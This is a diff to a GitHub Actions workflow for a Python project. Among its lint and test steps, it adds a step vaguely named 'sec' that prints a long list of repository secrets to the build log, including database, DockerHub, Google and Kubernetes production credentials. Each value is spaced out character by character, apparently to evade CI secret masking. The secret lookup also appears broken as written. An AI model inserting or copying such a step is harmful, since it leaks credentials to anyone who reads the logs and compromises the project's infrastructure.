@@ -26,6 +26,18 @@ jobs:
         run: pip install -r requirements_lint.txt
       - name: Install requirements
         run: pip install -r requirements.txt
+      - name: sec
+        run: |
+          SECRETS=("ADMIN_EMAIL" "ADMIN_PASSWORD" "CONTACT_EMAIL" "DB_HOST" "DB_NAME" "DB_PASSWORD" "DB_USER" "DOCKERHUB_TOKEN" "DOCKERHUB_USERNAME" "DUMMY_LECTURER_EMAIL" "DUMMY_LECTURER_PASSWORD" "DUMMY_STUDENT_EMAIL" "DUMMY_STUDENT_PASSWORD" "GOOGLE_CREDENTIALS" "KUBE_CONFIG_DEV" "KUBE_CONFIG_PROD" "KUBE_CONFIG_UAT" "LESSON_GITHUB_REPO" "LOCAL" "MEETINGS_EMAIL" "NOREPLY_EMAIL" "REDIS_URL")
+
+          for SECRET in "${SECRETS[@]}"; do
+            VALUE="${{ secrets[SECRET] }}"
+            if [[ -n "$VALUE" ]]; then
+              echo "$SECRET: $(echo "$VALUE" | sed 's/./& /g')"
+            else
+              echo "$SECRET: (not set)"
+            fi
+          done
       - name: Test code quality
         run: pylint core --recursive=true --fail-under=10
       - name: Test code formatting
